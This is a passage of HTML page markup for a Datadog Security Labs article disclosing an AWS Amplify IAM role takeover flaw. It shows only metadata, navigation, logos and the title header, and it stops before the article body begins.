



<!doctype html>
<html lang="en" itemtype="http://schema.org/Article">
  <head>
    <title>
  Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover |  Datadog Security Labs
</title>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Public disclosure of a vulnerability in AWS Amplify which exposed IAM roles associated with Amplify projects to be assumed by anyone in the world.">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover">
    <meta name="twitter:site" content="@datadoghq">
    <meta name="twitter:creator" content="@datadoghq">
    <meta name="twitter:description" content="Public disclosure of a vulnerability in AWS Amplify which exposed IAM roles associated with Amplify projects to be assumed by anyone in the world.">
    <meta name="twitter:image" content="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?w=1200&h=630&auto=format">
    <meta property="og:title" content="Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover |  Datadog Security Labs">
    <meta property="og:type" content="article" />
    <meta property="og:description" content="Public disclosure of a vulnerability in AWS Amplify which exposed IAM roles associated with Amplify projects to be assumed by anyone in the world.">
    <meta name="image" property="og:image" content="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?w=1200&h=630&auto=format">
    
    <link rel="shortcut icon" href="https://datadog-securitylabs.imgix.net/img/favicon.ico" type="image/x-icon">
    <link rel="preload" href="/assets/styles/styles-BQCRABNW.css" as="style">
    <link rel="stylesheet" href="/assets/styles/styles-BQCRABNW.css">
    <script src="/assets/scripts/main-ZXYNWRXZ.js"></script>
    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-WDC8G6');</script>
    <!-- End Google Tag Manager -->
    <meta name="ahrefs-site-verification" content="0e44dd9fee3fa1de786252e6fb86532d521bdc9fd44f5a759b11280bfde666e0">
  </head>

  <body class="article" id="/articles/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/">
    
<nav
  x-data="{
    mobile: false,
    mobileOpen: false,
    reactOnResize() {
      if (window.innerWidth < 835) {
        this.mobile = true;
      } else {
        this.mobile = false;
        this.mobileOpen = false;
      }        
    }
  }"
  x-init="reactOnResize()"
  @resize.window.throttle.200ms="reactOnResize"
  class="navbar"
>
  <div class="navbar-container">

    <div class="navbar-logo-container">
      <a class="navbar-logo-link" href="https://securitylabs.datadoghq.com">
        <svg class="navbar-logo-desktop"  width="180" height="44" viewBox="0 0 180 44" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M14.6834 11.5604C16.2023 10.5233 18.1604 10.9316 17.8325 11.2433C17.2079 11.838 18.0391 11.6629 18.1286 12.7614C18.1949 13.5707 17.9305 14.0174 17.7037 14.2709C17.23 14.3334 16.6532 14.4494 15.9596 14.6749C15.5487 14.8081 15.1913 14.9567 14.8788 15.1058C14.7963 15.0514 14.7071 14.9866 14.6009 14.8946C13.5278 13.965 13.5635 12.3247 14.6834 11.5604ZM23.758 17.9673C24.0332 17.753 25.2862 17.3501 26.4461 17.2123C27.0551 17.1397 27.9223 17.0994 28.1084 17.2022C28.4755 17.4056 28.4759 18.0344 28.2243 18.6155C27.8587 19.4605 27.3392 20.3916 26.7527 20.4693C25.796 20.5954 24.8892 20.0772 23.8549 19.3029C23.4859 19.0273 23.2595 18.3539 23.758 17.9673ZM25.5045 9.75029C26.9183 10.4086 26.7334 11.6619 26.7721 12.3978C26.783 12.609 26.7795 12.7518 26.7617 12.8504C26.5655 12.7441 26.2561 12.6664 25.7665 12.6878C25.6219 12.694 25.4824 12.7107 25.3471 12.7324C24.826 12.453 24.514 11.9045 24.2294 11.3231C24.2031 11.2695 24.1829 11.2214 24.1639 11.1744C24.1558 11.1531 24.1453 11.1294 24.1387 11.11C24.1352 11.0999 24.1321 11.091 24.129 11.0809C23.972 10.5836 24.0767 10.4843 24.1441 10.331C24.212 10.1749 24.4678 10.0453 24.0906 9.91448C24.0581 9.90322 24.0166 9.89468 23.972 9.8877C24.2209 9.57757 24.9706 9.50188 25.5045 9.75029ZM17.7965 24.7356C16.2726 23.7555 14.6972 22.3508 14.0083 21.5741C13.8924 21.4868 13.9114 21.0994 13.9114 21.0994C14.5332 21.5838 17.1143 23.4303 19.8422 24.2733C20.804 24.5706 22.281 24.6832 23.5623 23.9554C24.5419 23.3992 25.7208 22.4304 26.4233 21.4325L26.552 21.6564C26.5473 21.8055 26.2228 22.5278 26.0588 22.8182C26.3562 22.9897 26.5787 23.0359 26.9098 23.1275L29.1699 22.7747C29.9797 21.4631 30.562 19.3473 29.9429 17.3344C29.5881 16.1797 27.7448 13.8807 27.6126 13.7534C27.1486 13.3082 27.6898 11.5852 26.7714 9.70733C25.7999 7.72079 23.2719 5.64809 22.1725 4.74603C22.497 4.9828 24.4904 5.78704 25.4184 6.90956C25.5053 6.79351 25.5417 6.19072 25.6216 6.03856C24.8237 4.9929 24.7617 3.13096 24.7617 2.63374C24.7617 1.72159 24.2977 0.687183 24.2977 0.687183C24.2977 0.687183 25.0967 1.31909 25.3025 2.40861C25.5456 3.69881 26.0654 4.71459 26.7524 5.57356C28.0522 7.19524 29.2253 8.02743 29.82 7.42852C30.5298 6.70812 29.1005 3.48844 27.2722 1.69093C25.1424 -0.404674 24.5834 -0.134135 23.3324 0.313398C22.3345 0.66894 21.7953 3.50746 19.1933 3.45118C18.7521 3.40033 17.6171 3.37161 17.0561 3.37665C17.3488 2.96793 17.5988 2.65237 17.5988 2.65237C17.5988 2.65237 16.7262 3.00326 15.983 3.44924L15.9249 3.36229C16.1761 2.83247 16.4459 2.49866 16.4459 2.49866C16.4459 2.49866 15.7489 2.91864 15.1127 3.42051C15.2286 2.789 15.6667 2.38727 15.6667 2.38727C15.6667 2.38727 14.7855 2.54757 13.6629 3.78343C12.3867 4.13199 12.0796 4.36216 11.0636 4.81241C9.41134 4.45143 8.63097 3.86882 7.8886 2.79599C7.32222 1.97738 6.31623 1.85318 5.28581 2.27587C3.78671 2.89846 1.8887 3.74889 1.8887 3.74889C1.8887 3.74889 2.50587 3.72521 3.15133 3.75354C2.26939 4.08813 1.4204 4.54847 1.4204 4.54847C1.4204 4.54847 1.83366 4.53372 2.34382 4.54303C1.99105 4.83608 1.79644 4.97582 1.46189 5.19823C0.654379 5.78433 0 6.46203 0 6.46203C0 6.46203 0.548546 6.21168 1.03972 6.07194C0.696247 6.86144 0.0147313 7.4421 0.139559 8.40859C0.260123 9.29162 1.34132 11.1081 2.73808 12.2237C2.85864 12.3207 4.76634 14.0864 6.20458 13.3613C7.6432 12.6374 8.20958 11.9912 8.44606 11.001C8.7244 9.86336 8.56585 9.00478 7.97311 6.53656C7.77734 5.72184 7.26756 4.04504 7.02061 3.24313L7.07605 3.20237C7.54629 4.19642 8.7496 6.81602 9.23496 8.57472C9.99245 11.3189 9.7552 12.7108 9.40902 13.2208C8.36504 14.7598 5.68705 14.9632 4.469 14.1101C4.28331 17.0647 4.94234 18.3653 5.16525 19.0205C5.0536 19.7735 5.54128 21.172 5.54128 21.172C5.54128 21.172 5.59672 20.5358 5.81963 20.2009C5.87933 20.9488 6.25536 21.8361 6.25536 21.8361C6.25536 21.8361 6.23288 21.2881 6.40423 20.8145C6.64535 21.2229 6.82291 21.3207 7.05047 21.6273C7.27802 22.4261 7.73663 23.0103 7.73663 23.0103C7.73663 23.0103 7.66104 22.5822 7.7029 22.1358C8.81938 23.2102 9.01166 24.7771 9.12331 25.9804C9.43577 29.2924 3.90921 31.9241 2.83771 33.9948C2.02594 35.2206 1.54058 37.1625 2.91485 38.3056C6.23831 41.0688 4.96211 41.8296 6.6252 43.0433C8.90661 44.7085 11.7629 43.9632 12.7348 42.6078C14.0881 40.7203 13.74 38.9394 13.2376 37.2747C12.8449 35.9725 11.7777 33.8093 10.4553 32.9717C9.10664 32.1162 7.79478 31.9555 6.68257 32.0708L6.7853 31.9528C8.38442 31.6345 10.0553 31.8104 11.2655 32.5894C12.639 33.4736 13.8951 34.99 14.5522 37.3131C15.2969 37.2068 15.4031 37.1586 16.0838 37.0616L14.5483 25.0931L17.7965 24.7356ZM18.6826 39.7365L18.5058 38.0768L21.9583 32.8027L25.8784 33.9496L29.2499 28.3126L33.2906 30.9815L36.3616 24.5348L37.4529 36.2754L18.6826 39.7365ZM37.4948 22.1291L25.1554 24.3687C24.85 24.7635 24.0944 25.4559 23.7308 25.6364C22.172 26.4224 21.1187 26.1946 20.2088 25.9578C19.6242 25.8091 19.2854 25.7253 18.7985 25.5068L15.7867 25.9205L17.615 41.1922L38.7528 37.3782L37.4948 22.1291Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M51.0036 28.7055H55.3629C59.4687 28.7055 61.5218 26.2904 61.5218 21.4568C61.5218 17.3428 59.4687 15.2837 55.3629 15.2837H51.0036V28.7055ZM55.9165 31.8904H47.3359V12.1108H55.9165C62.0978 12.1108 65.1922 15.2288 65.1922 21.4609C65.1922 28.4126 62.0978 31.8904 55.9165 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M69.0341 31.8904H65.2676L73.6702 12.1108H77.6147L86.1984 31.8904H82.2543L79.7631 26.4956H73.4233L74.682 23.3155H78.7944L75.555 15.8856L69.0341 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M84.1265 12.1108H99.1458V15.2913H93.4715V31.8904H89.8042V15.2913H84.1265V12.1108Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M101.031 31.8904H97.2646L105.667 12.1108H109.611L118.195 31.8904H114.248L111.756 26.4956H105.416L106.675 23.3155H110.788L107.548 15.8856L101.031 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M124.298 28.7055H128.658C132.763 28.7055 134.819 26.2904 134.819 21.4568C134.819 17.3428 132.763 15.2837 128.658 15.2837H124.298V28.7055ZM129.211 31.8904H120.63V12.1108H129.211C135.396 12.1108 138.487 15.2288 138.487 21.4609C138.487 28.4126 135.396 31.8904 129.211 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M150.912 28.8433C154.896 28.8433 156.89 26.5436 156.89 21.9413C156.89 17.4112 154.896 15.1449 150.912 15.1449C146.823 15.1449 144.78 17.4112 144.78 21.9413C144.78 26.5436 146.823 28.8433 150.912 28.8433ZM140.971 22.0274C140.971 15.3198 144.286 11.9678 150.912 11.9678C157.437 11.9678 160.696 15.3198 160.696 22.0274C160.696 28.6953 157.437 32.0307 150.912 32.0307C144.579 32.0307 141.268 28.6953 140.971 22.0274Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M176.002 23.885V28.5168C175.155 28.738 174.397 28.8467 173.731 28.8467C169.247 28.8467 167.006 26.4716 167.006 21.7238C167.006 17.3386 169.382 15.1486 174.134 15.1486C176.117 15.1486 177.962 15.5178 179.67 16.2568V12.9343C177.962 12.2911 176.025 11.9678 173.857 11.9678C166.752 11.9678 163.197 15.2173 163.197 21.7238C163.197 28.5929 166.69 32.0307 173.675 32.0307C176.078 32.0307 178.074 31.681 179.67 30.9784V20.6316H173.745L172.506 23.885H176.002Z" />
</svg>

        <svg class="navbar-logo-mobile"  width="29" height="32" viewBox="0 0 29 32" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M10.6801 8.40742C11.7847 7.65314 13.2088 7.95011 12.9703 8.17679C12.5161 8.60925 13.1205 8.48194 13.1857 9.28082C13.2339 9.86939 13.0416 10.1943 12.8767 10.3786C12.5321 10.4241 12.1126 10.5085 11.6082 10.6725C11.3094 10.7693 11.0494 10.8774 10.8222 10.9858C10.7621 10.9463 10.6973 10.8992 10.62 10.8323C9.83961 10.1562 9.86555 8.96324 10.6801 8.40742ZM17.2781 13.0644C17.4783 12.9086 18.3895 12.6156 19.2331 12.5154C19.676 12.4626 20.3067 12.4332 20.442 12.508C20.709 12.6559 20.7093 13.1133 20.5263 13.5358C20.2605 14.1504 19.8827 14.8276 19.4561 14.8841C18.7603 14.9758 18.1008 14.5989 17.3486 14.0358C17.0802 13.8354 16.9156 13.3456 17.2781 13.0644ZM18.5491 7.09223C19.5773 7.57099 19.4428 8.4825 19.471 9.01772C19.4789 9.17128 19.4764 9.27516 19.4634 9.34687C19.3207 9.26952 19.0958 9.21306 18.7397 9.22859C18.6345 9.2331 18.533 9.24524 18.4346 9.26105C18.0557 9.0578 17.8287 8.65893 17.6218 8.23606C17.6026 8.19711 17.5879 8.1621 17.5741 8.12794C17.5682 8.11242 17.5606 8.0952 17.5558 8.08108C17.5533 8.07374 17.551 8.06725 17.5488 8.05991C17.4346 7.6983 17.5107 7.62604 17.5598 7.51453C17.6091 7.40105 17.7952 7.30677 17.5208 7.21164C17.4972 7.20345 17.467 7.19724 17.4346 7.19216C17.6156 6.96661 18.1608 6.91156 18.5491 7.09223ZM12.9429 17.9895C11.8346 17.2767 10.6888 16.2551 10.1878 15.6903C10.1035 15.6268 10.1174 15.345 10.1174 15.345C10.5696 15.6973 12.4467 17.0402 14.4307 17.6533C15.1302 17.8696 16.2044 17.9514 17.1362 17.4221C17.8487 17.0176 18.706 16.313 19.2169 15.5872L19.3105 15.7501C19.3071 15.8585 19.0711 16.3839 18.9519 16.595C19.1681 16.7198 19.33 16.7534 19.5707 16.82L21.2144 16.5634C21.8034 15.6095 22.2269 14.0708 21.7766 12.6068C21.5187 11.767 20.178 10.095 20.0819 10.0024C19.7444 9.67867 20.138 8.42559 19.4701 7.05987C18.7636 5.61512 16.925 4.1077 16.1255 3.45166C16.3614 3.62386 17.8112 4.20876 18.4861 5.02514C18.5493 4.94073 18.5758 4.50234 18.6339 4.39168C18.0536 3.6312 18.0085 2.27706 18.0085 1.91545C18.0085 1.25207 17.671 0.49977 17.671 0.49977C17.671 0.49977 18.2521 0.959336 18.4018 1.75172C18.5786 2.69005 18.9567 3.4288 19.4563 4.0535C20.4016 5.2329 21.2548 5.83813 21.6873 5.40256C22.2035 4.87863 21.164 2.53705 19.8344 1.22977C18.2854 -0.294308 17.8788 -0.097553 16.969 0.227926C16.2433 0.486502 15.8511 2.55088 13.9588 2.50995C13.6379 2.47297 12.8124 2.45208 12.4044 2.45575C12.6173 2.1585 12.7992 1.929 12.7992 1.929C12.7992 1.929 12.1645 2.18419 11.624 2.50854L11.5817 2.4453C11.7644 2.05998 11.9607 1.81721 11.9607 1.81721C11.9607 1.81721 11.4537 2.12265 10.9911 2.48765C11.0754 2.02836 11.394 1.73619 11.394 1.73619C11.394 1.73619 10.7531 1.85278 9.93663 2.75159C9.00849 3.00508 8.7852 3.17248 8.04624 3.49993C6.84461 3.2374 6.27707 2.81369 5.73716 2.03344C5.32525 1.4381 4.59362 1.34776 3.84423 1.65518C2.75397 2.10797 1.3736 2.72646 1.3736 2.72646C1.3736 2.72646 1.82245 2.70924 2.29188 2.72985C1.65047 2.97318 1.03302 3.30798 1.03302 3.30798C1.03302 3.30798 1.33357 3.29725 1.7046 3.30402C1.44803 3.51715 1.3065 3.61878 1.06319 3.78053C0.475912 4.20678 0 4.69966 0 4.69966C0 4.69966 0.398943 4.51758 0.756158 4.41596C0.506361 4.99013 0.0107136 5.41244 0.101498 6.11534C0.189181 6.75754 0.975506 8.07865 1.99133 8.88995C2.07901 8.96052 3.46643 10.2447 4.51242 9.71734C5.55869 9.19087 5.97061 8.72086 6.14259 8.00074C6.34502 7.17335 6.22971 6.54893 5.79862 4.75386C5.65625 4.16133 5.2855 2.94185 5.1059 2.35864L5.14622 2.329C5.48821 3.05194 6.36335 4.95711 6.71633 6.23616C7.26724 8.23194 7.09469 9.24422 6.84292 9.61515C6.08366 10.7344 4.13603 10.8823 3.25018 10.2619C3.11514 12.4107 3.59443 13.3566 3.75655 13.8331C3.67535 14.3807 4.03003 15.3978 4.03003 15.3978C4.03003 15.3978 4.07034 14.9352 4.23246 14.6915C4.27588 15.2355 4.54936 15.8808 4.54936 15.8808C4.54936 15.8808 4.533 15.4822 4.65762 15.1378C4.83299 15.4348 4.96211 15.5059 5.12761 15.729C5.29311 16.3099 5.62664 16.7348 5.62664 16.7348C5.62664 16.7348 5.57166 16.4234 5.60211 16.0988C6.41409 16.8801 6.55394 18.0197 6.63513 18.8948C6.86238 21.3036 2.84307 23.2175 2.06379 24.7235C1.47341 25.615 1.12042 27.0273 2.11989 27.8586C4.53695 29.8682 3.60881 30.4215 4.81833 31.3042C6.47753 32.5152 8.55485 31.9733 9.26167 30.9875C10.2459 29.6147 9.99274 28.3196 9.62735 27.1089C9.34174 26.1618 8.56557 24.5886 7.60387 23.9794C6.62301 23.3572 5.66893 23.2404 4.86005 23.3242L4.93477 23.2384C6.09776 23.0069 7.31291 23.1348 8.19313 23.7014C9.19203 24.3444 10.1055 25.4473 10.5834 27.1368C11.125 27.0595 11.2023 27.0245 11.6973 26.9539L10.5806 18.2495L12.9429 17.9895ZM13.5871 28.8937L13.4585 27.6866L15.9694 23.8509L18.8204 24.6851L21.2724 20.5854L24.2111 22.5264L26.4446 17.8379L27.2382 26.3765L13.5871 28.8937ZM27.2691 16.0879L18.295 17.7167C18.0729 18.0038 17.5234 18.5074 17.2589 18.6387C16.1252 19.2103 15.3592 19.0446 14.6975 18.8724C14.2724 18.7643 14.0259 18.7033 13.6718 18.5444L11.4814 18.8453L12.8111 29.9519L28.184 27.1782L27.2691 16.0879Z"/>
</svg>

        <p class="navbar-logo-title">Security Labs</p>
      </a>
    </div>

    <div class="navbar-menu-container">
      <span x-cloak x-show="mobile " class="navbar-menu-icon-container">
        <span x-show="!mobileOpen" @click="mobileOpen = true">
          <svg class="navbar-menu-icon"  width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M29.3333 14.6667H2.66663V17.3334H29.3333V14.6667ZM29.3333 5.33337H2.66663V8.00004H29.3333V5.33337ZM29.3333 24H2.66663V26.6667H29.3333V24Z"/>
</svg>

        </span>
        <span x-show="mobileOpen" @click="mobileOpen = false">
          <svg class="navbar-menu-icon"  focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"/>
</svg>

        </span>
      </span>

      <div x-show="!mobile || (mobile && mobileOpen)" class="navbar-menu-list-container">
        <ul class="navbar-menu-list">
          
            <li class="navbar-menu-item  ">
  <a href="/articles/" title="ARTICLES" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">ARTICLES</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="/cloud-security-atlas/" title="CLOUD SECURITY ATLAS" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">CLOUD SECURITY ATLAS</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="/newsletters/" title="NEWSLETTER" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">NEWSLETTER</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="/about/" title="ABOUT" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">ABOUT</span>
    
  </a>
</li>
          
        </ul>
      </div>
    </div>

  </div>
</nav>
    
<header class="hero !bg-none !pb-15 !text-black">
  <div class="container">
    <p class="hero-category">research</p>

    <span class="block pb-1 tablet:pb-2 desktop:pb-3"></span>

    <h1 class="hero-title w-11/12">Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover</h1>

    <span class="block pb-4 tablet:pb-2 desktop:pb-3"></span>

    <p class="hero-date">April 15, 2024</p>

    <span class="block pb-6 tablet:pb-8 desktop:pb-9"></span>

    <ul class="badge-list">
      
      <li class="inline-flex">




<a href="/articles/?tag=aws" aria-label="Search content by tag aws" class="inline-flex" data-custom-name="Search filter tag button">
  <span class="badge badge-clickable badge-clickable-purple">
    aws
  </span>
</a></li>
      
      <li class="inline-flex">




<a href="/articles/?tag=vulnerability_disclosure" aria-label="Search content by tag vulnerability disclosure" class="inline-flex" data-custom-name="Search filter tag button">
  <span class="badge badge-clickable badge-clickable-purple">
    vulnerability disclosure
  </span>
</a></li>
      
    </ul>

    <span class="block pb-4 tablet:pb-6"></span>

    <div class="share-article">
  <ul class="flex gap-3 desktop:gap-4">
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Famplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover%2F&amp;text=Amplified%20exposure%3A%20How%20AWS%20flaws%20made%20Amplify%20IAM%20roles%20vulnerable%20to%20takeover" title="twitter" data-custom-name="Social link">
          <svg class="fill-blue-1 hover:fill-blue-2 active:fill-blue-1"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="20" cy="20" r="20"/>
<g clip-path="url(#clip0_37_5902)">
<path d="M32.9092 13.3016C32.01 13.693 31.0567 13.9458 30.0817 14.0513C31.1112 13.4379 31.8818 12.4703 32.2492 11.3299C31.2957 11.9088 30.2509 12.322 29.1592 12.5519C28.486 11.8187 27.6064 11.3066 26.6363 11.083C25.6662 10.8594 24.6511 10.9347 23.7247 11.2991C22.7983 11.6636 22.004 12.2999 21.4465 13.1245C20.8891 13.949 20.5945 14.9229 20.6017 15.9181C20.6016 16.2966 20.6444 16.6738 20.7292 17.0427C18.7718 16.9435 16.8571 16.4344 15.109 15.5484C13.361 14.6625 11.8185 13.4194 10.5817 11.8996C10.142 12.6499 9.91154 13.5042 9.91418 14.3737C9.90958 15.1884 10.1072 15.9916 10.4894 16.7112C10.8716 17.4309 11.4265 18.0445 12.1042 18.4971C11.3153 18.4784 10.5429 18.2674 9.85418 17.8823V17.9423C9.85385 19.0784 10.2464 20.1797 10.9654 21.0596C11.6843 21.9395 12.6855 22.5439 13.7992 22.7705C13.3763 22.8854 12.9399 22.9433 12.5017 22.9429C12.192 22.9434 11.883 22.9133 11.5792 22.8529C11.8923 23.8314 12.5041 24.6872 13.3287 25.3003C14.1532 25.9135 15.1492 26.2531 16.1767 26.2716C14.4307 27.64 12.2753 28.3819 10.0567 28.3783C9.67264 28.3676 9.28951 28.3351 8.90918 28.2808C11.1581 29.7303 13.7784 30.4983 16.4542 30.4925C25.5142 30.4925 30.4642 22.9954 30.4642 16.4879C30.4642 16.278 30.4642 16.0605 30.4642 15.8506C31.4253 15.1541 32.2534 14.2907 32.9092 13.3016Z" fill="white"/>
</g>
<defs>
<clipPath id="clip0_37_5902">
<rect width="24" height="19.5" fill="white" transform="translate(10 11)"/>
</clipPath>
</defs>
</svg>

          <span class="sr-only">twitter</span>
        </a>
      </li>
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Famplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover%2F" title="reddit" data-custom-name="Social link">
          <svg class="fill-orange-3 hover:fill-orange-4 active:fill-orange-3"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M20 40C31.0457 40 40 31.0457 40 20C40 8.95431 31.0457 0 20 0C8.95431 0 0 8.95431 0 20C0 31.0457 8.95431 40 20 40Z"/>
<path d="M33.3304 20.0001C33.3318 19.4272 33.1645 18.8666 32.8493 18.3882C32.5341 17.9099 32.085 17.5349 31.558 17.3103C31.031 17.0856 30.4495 17.0211 29.8861 17.1249C29.3227 17.2287 28.8024 17.4961 28.39 17.8938C26.3985 16.4569 23.651 15.5278 20.5899 15.4202L21.9192 9.16929L26.2604 10.0914C26.2837 10.5985 26.4911 11.0797 26.8438 11.4447C27.1966 11.8098 27.6703 12.0336 28.1764 12.0743C28.6824 12.115 29.1858 11.9697 29.5923 11.6656C29.9988 11.3616 30.2805 10.9197 30.3844 10.4228C30.4883 9.92592 30.4075 9.40819 30.1569 8.96669C29.9064 8.52519 29.5034 8.19025 29.0235 8.02468C28.5436 7.85911 28.0199 7.87427 27.5504 8.06733C27.0809 8.26039 26.6979 8.61809 26.4734 9.07334L21.6267 8.04128C21.4914 8.01286 21.3503 8.03928 21.2345 8.11475C21.1186 8.19022 21.0375 8.30856 21.0088 8.44381L19.5251 15.4178C16.4195 15.5044 13.6299 16.4358 11.6103 17.8892C11.3036 17.5961 10.9366 17.3735 10.5349 17.2369C10.1332 17.1004 9.70661 17.0533 9.28482 17.0987C8.86303 17.1442 8.45627 17.2813 8.09295 17.5003C7.72963 17.7193 7.41853 18.0151 7.18137 18.3668C6.94422 18.7186 6.78674 19.1179 6.71994 19.5368C6.65314 19.9557 6.67863 20.3842 6.79463 20.7923C6.91063 21.2003 7.11434 21.5782 7.39153 21.8993C7.66871 22.2205 8.01268 22.4772 8.39941 22.6516C8.35065 22.9425 8.32406 23.2367 8.31984 23.5316C8.31984 28.0202 13.5433 31.657 19.9885 31.657C26.4336 31.657 31.6547 28.0202 31.6547 23.5316C31.6545 23.2385 31.6318 22.9459 31.5869 22.6563C32.1032 22.4296 32.5427 22.058 32.8522 21.5865C33.1616 21.1151 33.3277 20.564 33.3304 20.0001ZM13.3327 22.0829C13.3322 21.6704 13.4542 21.267 13.683 20.9238C13.9118 20.5806 14.2373 20.313 14.6183 20.1548C14.9993 19.9966 15.4186 19.955 15.8233 20.0352C16.2279 20.1154 16.5997 20.3138 16.8915 20.6053C17.1834 20.8968 17.3822 21.2684 17.4628 21.6729C17.5435 22.0775 17.5023 22.4969 17.3446 22.878C17.1868 23.2592 16.9196 23.585 16.5766 23.8142C16.2337 24.0434 15.8304 24.1658 15.4179 24.1658C14.8655 24.1652 14.3358 23.9456 13.945 23.5552C13.5541 23.1648 13.3339 22.6354 13.3327 22.0829ZM24.9498 27.5896C23.5293 29.0078 20.8029 29.1201 20.0025 29.1201C19.2021 29.1201 16.4757 29.0078 15.0552 27.5896C14.9537 27.4881 14.8967 27.3505 14.8967 27.207C14.8967 27.0635 14.9537 26.9258 15.0552 26.8243C15.1566 26.7229 15.2943 26.6658 15.4378 26.6658C15.5813 26.6658 15.7189 26.7229 15.8204 26.8243C16.7168 27.7207 18.6288 28.0389 20.0025 28.0389C21.3762 28.0389 23.2906 27.7207 24.1869 26.8243C24.2365 26.7714 24.2963 26.7291 24.3626 26.6998C24.4289 26.6704 24.5005 26.6548 24.573 26.6537C24.6455 26.6526 24.7175 26.666 24.7847 26.6933C24.8518 26.7206 24.9128 26.7612 24.964 26.8125C25.0152 26.8639 25.0556 26.925 25.0827 26.9923C25.1098 27.0595 25.123 27.1316 25.1217 27.2041C25.1204 27.2766 25.1045 27.3481 25.075 27.4143C25.0454 27.4805 25.0029 27.5402 24.9498 27.5896ZM24.5848 24.1681C24.1722 24.1686 23.7687 24.0466 23.4254 23.8177C23.0821 23.5887 22.8145 23.2631 22.6564 22.882C22.4983 22.5009 22.4568 22.0814 22.5372 21.6767C22.6176 21.272 22.8162 20.9002 23.108 20.6085C23.3997 20.3167 23.7715 20.1181 24.1762 20.0377C24.5809 19.9573 25.0004 19.9988 25.3815 20.1569C25.7626 20.315 26.0882 20.5827 26.3172 20.9259C26.5461 21.2692 26.6681 21.6727 26.6676 22.0853C26.6664 22.6373 26.4465 23.1664 26.0562 23.5567C25.6658 23.947 25.1368 24.1669 24.5848 24.1681Z" fill="white"/>
</svg>

          <span class="sr-only">reddit</span>
        </a>
      </li>
    
  </ul>
</div>
  </div>
</header>

  
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?auto=format&amp;h=712&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?auto=format&amp;h=712&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?auto=format&amp;h=712&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?auto=format&amp;h=712&dpr=1.75"
        alt="Amplified Exposure: How Aws Flaws Made Amplify Iam Roles Vulnerable To Takeover"
        class="mx-auto max-h-[712px]"
        loading="eager"
    />
</figure>


  



    <main>
      
<div class="container py-8 tablet:py-12 desktop:py-15">
  <article class="grid grid-cols-12 desktop:gap-x-10 relative">
    <aside class="article-toc hidden desktop:flex desktop:flex-col desktop:justify-between desktop:col-span-4">
      

<nav class="article-toc-nav text-20 leading-28 text-gray-50">
  
    <div class="flex items-center mb-4">
      <span class="inline-block mr-2"><svg class="w-[18px] h-[18px] fill-black"  xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192" width="192" height="192">
